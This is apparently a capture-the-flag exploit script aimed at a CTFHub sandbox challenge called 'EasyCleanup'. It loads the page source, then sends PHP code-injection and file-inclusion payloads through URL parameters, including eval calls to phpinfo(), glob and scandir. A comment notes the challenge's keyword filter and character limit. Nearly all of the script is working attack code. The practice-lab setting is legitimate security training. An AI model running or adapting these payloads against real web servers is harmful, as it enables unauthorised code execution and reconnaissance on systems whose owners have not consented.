#!/usr/bin/env python3
"""Explore EasyCleanup — get full source and exploit."""
import sys, json, time, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.path.insert(0, 'D:/ai')
from tools.feeder.spa_crawler import SpaCrawler

c = SpaCrawler()
c.connect('ctfhub')

target = 'http://challenge-c295913eebc950ce.sandbox.ctfhub.com:10800'

# Get full page source
c._send('Page.navigate', {'url': target})
time.sleep(2)
while c._recv_any(0.3):
    pass

# Get the full text content (strip HTML tags for cleaner view)
text = c.evaluate('document.body.textContent')
print('=== FULL SOURCE ===')
print(text)
print('\n=== END SOURCE ===')

# Now try exploits
# The filter bans: while, for, \$_ , include, env, require, ?, :, ^, +, -, %, *, `
# checkNums function - need to see it
# 15 char limit for both file and shell params

# Try 1: file=flag.php (8 chars, passes filter, but includes as PHP - might execute instead of showing)
print('\n--- Test 1: file=flag.php ---')
c._send('Page.navigate', {'url': f'{target}/?file=flag.php'})
time.sleep(1.5)
while c._recv_any(0.3):
    pass
body = c.evaluate('document.body.textContent.substring(0, 2000)')
print(f'Result: {body}')

# Try 2: mode=eval with phpinfo (shell=phpinfo(); = 10 chars)
print('\n--- Test 2: mode=eval&shell=phpinfo(); ---')
c._send('Page.navigate', {'url': f'{target}/?mode=eval&shell=phpinfo();'})
time.sleep(1.5)
while c._recv_any(0.3):
    pass
body = c.evaluate('document.body.textContent.substring(0, 2000)')
print(f'Result: {body}')

# Try 3: mode=eval with show_source (too long but try shorter)
# shell=readfile('f*') = 16 chars, too long
# shell=glob('*') = 10 chars
print('\n--- Test 3: mode=eval&shell=glob("*"); ---')
c._send('Page.navigate', {'url': f'{target}/?mode=eval&shell=glob("*");'})
time.sleep(1.5)
while c._recv_any(0.3):
    pass
body = c.evaluate('document.body.textContent.substring(0, 2000)')
print(f'Result: {body}')

# Try 4: Check what files exist with glob
print('\n--- Test 4: mode=eval&shell=print_r(scandir(".")); ---')
c._send('Page.navigate', {'url': f'{target}/?mode=eval&shell=print_r(scandir("."));'})
time.sleep(1.5)
while c._recv_any(0.3):
    pass
body = c.evaluate('document.body.textContent.substring(0, 2000)')
print(f'Result: {body}')
